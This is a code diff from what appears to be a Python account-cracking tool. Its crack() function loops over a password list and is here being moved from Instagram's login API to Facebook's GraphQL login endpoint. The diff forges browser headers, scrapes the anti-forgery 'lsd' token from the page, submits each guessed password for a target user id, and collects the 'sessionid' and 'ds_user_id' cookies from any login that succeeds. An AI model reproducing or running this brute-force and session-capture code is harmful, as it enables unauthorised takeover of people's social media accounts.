@@ -125,28 +125,24 @@ def crack(uid, password_list, total_count):
             'dpr': '2.75',
             'wd': '980x1040',}
             headers = {
-            'accept': '*/*',
-            'accept-language': 'en-US,en;q=0.7',
-            'content-type': 'application/x-www-form-urlencoded',
-            'origin': 'https://www.instagram.com',
-            'priority': 'u=1, i',
-            'referer': 'https://www.instagram.com/',
-            'sec-ch-ua': '"Brave";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
-            'sec-ch-ua-full-version-list': '"Brave";v="143.0.0.0", "Chromium";v="143.0.0.0", "Not A(Brand";v="24.0.0.0"',
+            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'sec-ch-ua': '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
             'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-model': '""',
-            'sec-ch-ua-platform': '"Windows"',
-            'sec-ch-ua-platform-version': '"10.0.0"',
-            'sec-fetch-dest': 'empty',
-            'sec-fetch-mode': 'cors',
-            'sec-fetch-site': 'same-origin',
-            'sec-gpc': '1',
-            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
-            'x-asbd-id': '359341',
-            'x-csrftoken': csrftoken,
+            'viewport-width': '980',
             'x-fb-friendly-name': 'useCDSWebLoginMutation',
-            'x-fb-lsd': 'AdElFI6SrbI',
-            'x-ig-app-id': '936619743392459',}
+            'x-fb-lsd': re.search('name="lsd" value="(.*?)"',str(response.text)).group(1),
+            'x-asbd-id': '359341',
+            'dpr': '2.75',
+            'sec-ch-ua-full-version-list': '".Not/A)Brand";v="99.0.0.0", "Google Chrome";v="103.0.5060.129", "Chromium";v="103.0.5060.129"',
+            'sec-ch-prefers-color-scheme': 'light',
+            'sec-ch-ua-platform': '"Linux"',
+            'origin': 'https://www.facebook.com',
+            'sec-fetch-site': 'same-origin',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-dest': 'empty',
+            'referer': 'https://www.facebook.com/?_rdr',
+            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',}
             data = {
     'av': '0',
     'user': '0',
@@ -183,50 +179,51 @@ def crack(uid, password_list, total_count):
             "caa_login_request_extra_info": {
                 "ab_test_data": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAJ",
                 "shared_prefs_data": "eyIzMDAwMCI6W3sidCI6MTc3Njc4NDAyMC40MjcsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS8ifSwidiI6ZmFsc2V9XSwiMzAwMDEiOlt7InQiOjE3NzY3ODQwMjAuNDI5LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vIn0sInYiOjB9XSwiMzAwMDIiOlt7InQiOjE3NzY3ODQwMjAuNDMsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS8ifSwidiI6MH1dLCIzMDAwMyI6W3sidCI6MTc3Njc4NDAyMC40MzEsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS8ifSwidiI6WyJlbi1JTiIsImVuLUdCIiwiZW4tVVMiLCJlbiJdfV0sIjMwMDA0IjpbeyJ0IjoxNzc2Nzg0MDIwLjQzMiwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tLyJ9LCJ2IjoxNTB9XSwiMzAwMDUiOlt7InQiOjE3NzY3ODQwMjAuNDMyLCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vIn0sInYiOnsidyI6OTgwLCJoIjoxNzk1fX1dLCIzMDAwNyI6W3sidCI6MTc3Njc4NDAyMC40MzMsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS8ifSwidiI6ImRlZmF1bHQifV0sIjMwMDA4IjpbeyJ0IjoxNzc2Nzg0MDIwLjQ3LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vIn0sInYiOiJwcm9tcHQifV0sIjMwMDEyIjpbeyJ0IjoxNzc2Nzg0MDIwLjQzOCwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tLyJ9LCJ2IjoiR29vZ2xlIEluYy4ifV0sIjMwMDEzIjpbeyJ0IjoxNzc2Nzg0MDIwLjQzOSwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tLyJ9LCJ2IjoiNS4wIChYMTE7IExpbnV4IHg4Nl82NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEwMy4wLjAuMCBTYWZhcmkvNTM3LjM2In1dLCIzMDAxNSI6W3sidCI6MTc3Njc4NDAyMC40MzksImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS8ifSwidiI6IkxpbnV4IGFybXY4bCJ9XSwiMzAwMTgiOlt7InQiOjE3NzY3ODQwMjAuNDQsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS8ifSwidiI6OH1dLCIzMDAyMiI6W3sidCI6MTc3Njc4NDAyMC40NjQsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS8ifSwidiI6dHJ1ZX1dLCIzMDA0MCI6W3sidCI6MTc3Njc4NDAyMC40NjUsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS8ifSwidiI6LTMzMH1dLCIzMDA5MyI6W3sidCI6MTc3Njc4NDAyMC40NjUsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS8ifSwidiI6NX1dLCIzMDA5NCI6W3sidCI6MTc3Njc4NDAyMC40NjYsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS8ifSwidiI6Ik1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEwMy4wLjAuMCBTYWZhcmkvNTM3LjM2In1dLCIzMDA5NSI6W3sidCI6MTc3Njc4NDAyMC40NjYsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS8ifSwidiI6NH1dLCIzMDEwNiI6W3sidCI6MTc3Njc4NDAyMC40MjIsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS8ifSwidiI6ZmFsc2V9LHsidCI6MTc3Njc4NDE3Mi41NCwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tLyJ9LCJ2Ijp0cnVlfV0sIjMwMTA3IjpbeyJ0IjoxNzc2Nzg0MDIwLjQyNCwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tLyJ9LCJ2IjpmYWxzZX0seyJ0IjoxNzc2Nzg0MTcyLjQ3NywiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tLyJ9LCJ2Ijp0cnVlfV19",
-            "cuid": "",
-            "guid": "fd107bb015eba910e",
-            "jazoest": "22326",
-            "lgndim": "eyJ3IjozOTMsImgiOjg1MSwiYXciOjM5MywiYWgiOjg1MSwiYyI6MjR9",
-            "lgnjs": "1776784020",
-            "lgnrnd": "080657_LjdH",
-            "locale": "en_GB",
-            "login_source": "comet_headerless_login",
-            "lsd": "AdSsBO32J9Ur0dTZcDPthuxde-s",
-            "next": "",
-            "prefill_contact_point": "",
-            "prefill_source": "",
-            "prefill_type": "",
-            "skstamp": "",
-            "timezone": "-330"
-        },
-        "credential_type": "password",
-        "dyi_job_id": "",
-        "enc_password": {
-            "sensitive_string_value": enc_password
-        },
-        "event_request_id": "115c179d-2d88-4f43-afcb-afb01dbc0276",
-        "identifier": uid,
-        "ig_web_device_id": None,
-        "initial_request_id": "1",
-        "lids": None,
-        "login_source": "COMET_HEADERLESS_LOGIN",
-        "next": None,
-        "passkey_payload": None,
-        "password": {
-            "sensitive_string_value": enc_password
-        },
-        "persistent": True,
-        "query_params": "{}",
-        "trusted_device_records": "{}",
-        "use_uid_to_login": False,
-        "waterfall_id": "c12c16ec-1d52-490f-a106-3c67895a3098"
+                "cuid": "",
+                "guid": "fd107bb015eba910e",
+                "jazoest": "22326",
+                "lgndim": "eyJ3IjozOTMsImgiOjg1MSwiYXciOjM5MywiYWgiOjg1MSwiYyI6MjR9",
+                "lgnjs": "1776784020",
+                "lgnrnd": "080657_LjdH",
+                "locale": "en_GB",
+                "login_source": "comet_headerless_login",
+                "lsd": re.search('name="lsd" value="(.*?)"',str(response.text)).group(1),
+                "next": "",
+                "prefill_contact_point": "",
+                "prefill_source": "",
+                "prefill_type": "",
+                "skstamp": "",
+                "timezone": "-330"
+            },
+            "credential_type": "password",
+            "dyi_job_id": "",
+            "enc_password": {
+                "sensitive_string_value": enc_password
+            },
+            "event_request_id": "115c179d-2d88-4f43-afcb-afb01dbc0276",
+            "identifier": uid,
+            "ig_web_device_id": None,
+            "initial_request_id": "1",
+            "lids": None,
+            "login_source": "COMET_HEADERLESS_LOGIN",
+            "next": None,
+            "passkey_payload": None,
+            "password": {
+                "sensitive_string_value": enc_password
+            },
+            "persistent": True,
+            "query_params": "{\"_rdr\":null}",
+            "trusted_device_records": "{}",
+            "use_uid_to_login": False,
+            "waterfall_id": "c12c16ec-1d52-490f-a106-3c67895a3098"
+        }
     }),
     'doc_id': '9807605492696448',
     'fb_api_analytics_tags': '["qpl_active_flow_ids=516759801"]',
 }
             # Make API request
             print(cookies)
-            response = session.post('https://www.instagram.com/api/graphql', cookies=cookies, headers=headers, data=data)
+            response = session.post('https://www.facebook.com/api/graphql/', cookies=cookies, headers=headers, data=data)
             wanted = ["ds_user_id", "sessionid"]
             all_cookies = session.cookies.get_dict()
             extracted = {k: all_cookies[k] for k in wanted if k in all_cookies}
